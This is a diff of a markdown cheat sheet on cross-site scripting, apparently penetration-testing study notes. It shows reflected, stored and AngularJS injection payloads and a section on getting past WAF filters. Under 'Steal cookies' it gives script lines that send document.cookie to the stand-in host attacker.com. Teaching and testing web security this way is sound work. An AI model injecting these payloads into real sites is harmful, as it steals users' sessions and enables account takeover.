@@ -1,12 +1,14 @@
 # XSS
 
-Cross-site scripting (XSS) works by manipulating a vulnerable web site so that it returns malicious JavaScript to users
+Cross-site scripting (XSS) works by manipulating a vulnerable web site so that it returns malicious JavaScript to users.
 
 XSS cheatsheet: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
+More info about Javascript & obfuscation: [javascript-security-considerations.md](../web-security/javascript-security-considerations.md "mention")
+
 <details>
 
-<summary>Do not use alert(1)</summary>
+<summary>Do not use alert(1) -> use alert(document.domain)</summary>
 
 ```html
 <textarea id="script" onchange=("unsafe(this.value)"></textarea><br>
@@ -39,7 +41,7 @@ https://insecure-website.com/search?term=<script>alert(document.domain)</script>
 
 ## <mark style="color:yellow;">**Stored XSS**</mark>
 
-The malicious script comes from the website's database. POST example:&#x20;
+The malicious script comes from the website's database. POST body example:&#x20;
 
 ```
 comment=<script>alert(document.domain)</script>
@@ -156,7 +158,7 @@ https://example.com/?search=test
 </body>
 ```
 
-Test
+**Test**
 
 ```sh
 https://example.com/?search=%7B%7B1%2B1%7D%7D # ?search={{1+1}}
@@ -170,7 +172,7 @@ https://example.com/?search=%7B%7B1%2B1%7D%7D # ?search={{1+1}}
 </body>
 ```
 
-Exploit
+**Exploit**
 
 ```sh
 https://example.comnet/?search=%7B%7B%24on.constructor%28%27alert%281%29%27%29%28%29%7D%7D
@@ -263,9 +265,9 @@ element.innerHTML = comment.author
 
 ### <mark style="color:yellow;">Into JavaScript</mark>
 
-**Terminating the existing script** (I don't really know why this works but it works).&#x20;
+**Terminating the existing script**
 
-The browser incorrectly interprets the `</script>` sequence within the string as the end of the script block, prematurely stopping the execution of your JavaScript script and generating an error.
+The browser interprets the `</script>` sequence within the string as the end of the script block, prematurely stopping the execution of your JavaScript script and generating an error.
 
 ```html
 <script>
@@ -319,15 +321,16 @@ ${alert(document.domain)}
 
 ## <mark style="color:yellow;">**Bypass WAF**</mark>
 
-If you receive an error like "tag  is not allowed" or "event is not allowed", use XSS cheat sheet ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) to discover a tag and event that work.
+If you receive an error like "tag is not allowed" or "event is not allowed", use XSS cheat sheet ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) to discover a tag and event that work.
 
 ## <mark style="color:yellow;">Exploitation</mark>
 
 ### &#x20;<mark style="color:yellow;">S</mark><mark style="color:yellow;">**teal cookies**</mark>
 
-```html
-<script>fetch('//attacker.com?'+document.cookie)</script>
-```
+<pre class="language-html"><code class="lang-html"><strong>&#x3C;script>fetch('//attacker.com?'+document.cookie)&#x3C;/script>
+</strong>&#x3C;!-- or -->
+&#x3C;script>location='//attacker.com?'?+document.cookie&#x3C;/script>
+</code></pre>
 
 ```html
 <script>
